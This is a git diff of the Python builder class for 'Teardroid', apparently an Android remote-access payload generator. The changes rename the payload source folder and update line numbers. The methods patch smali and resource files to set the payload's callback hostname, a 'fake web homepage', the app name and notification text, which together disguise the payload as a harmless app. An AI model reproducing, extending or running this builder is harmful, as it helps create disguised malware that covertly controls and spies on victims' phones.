@@ -7,8 +7,9 @@ import platform
 class Teardroid:
     def __init__(self, name) -> None:
         self.name = name
+        self.source_folder = "app-release"
         self.AppInfo = os.path.join(os.getcwd(
-        ), "Teardroid_Payload", "smali", "com", "example", "teardroidv2", "AppInfo.smali")
+        ), self.source_folder , "smali", "com", "example", "teardroidv2", "AppInfo.smali")
         self.os = os.name
 
     def build(self, hostname) -> None:
@@ -23,21 +24,21 @@ class Teardroid:
     def changeNotification(self, title, content, subtext) -> None:
         self.print_result("Changing notification title to " + title)
         title = {'data': '    const-string v0, "{title}"'.format(
-            title=title), 'line_number': 139, 'file': self.AppInfo}
+            title=title), 'line_number': 145, 'file': self.AppInfo}
         self.modify_file(title)
         self.print_result("Changing notification content to " + content)
         content = {'data': '    const-string v0, "{content}"'.format(
-            content=content), 'line_number': 144, 'file': self.AppInfo}
+            content=content), 'line_number': 150, 'file': self.AppInfo}
         self.modify_file(content)
         self.print_result("Changing notification subtext to " + subtext)
         subtext = {'data': '    const-string v0, "{subtext}"'.format(
-            subtext=subtext), 'line_number': 149, 'file': self.AppInfo}
+            subtext=subtext), 'line_number': 155, 'file': self.AppInfo}
         self.modify_file(subtext)
         self.print_result("Changing notification completed")
 
     def changeAppname(self) -> None:
         self.print_result("Changing app name to " + self.name)
-        file = os.path.join(os.getcwd(), "Teardroid_Payload",
+        file = os.path.join(os.getcwd(), self.source_folder,
                             "res", "values", "strings.xml")
         self.modify_file({'data': '    <string name="app_name">{AppName}</string>'.format(
             AppName=self.name), 'line_number': 31, 'file': file})
@@ -46,7 +47,7 @@ class Teardroid:
     def ChangeFakeWebPage(self, FakewebHost) -> None:
         self.print_result("Changing fake web homepage to " + FakewebHost)
         data = {'data': '    const-string v0, "{hostname}"'.format(
-            hostname=FakewebHost), 'line_number': 154, 'file': self.AppInfo}
+            hostname=FakewebHost), 'line_number': 160, 'file': self.AppInfo}
         self.modify_file(data)
         self.print_result("Changing fake web homepage completed")
 
@@ -58,7 +59,7 @@ class Teardroid:
             hostname = hostname[:-1]
         self.print_result("Changing hostname to " + hostname)
         data = {'data': '    const-string v0, "{hostname}"'.format(
-            hostname=hostname), 'line_number': 134, 'file': self.AppInfo}
+            hostname=hostname), 'line_number': 140, 'file': self.AppInfo}
         self.modify_file(data)
         self.print_result("Changing hostname completed")
 
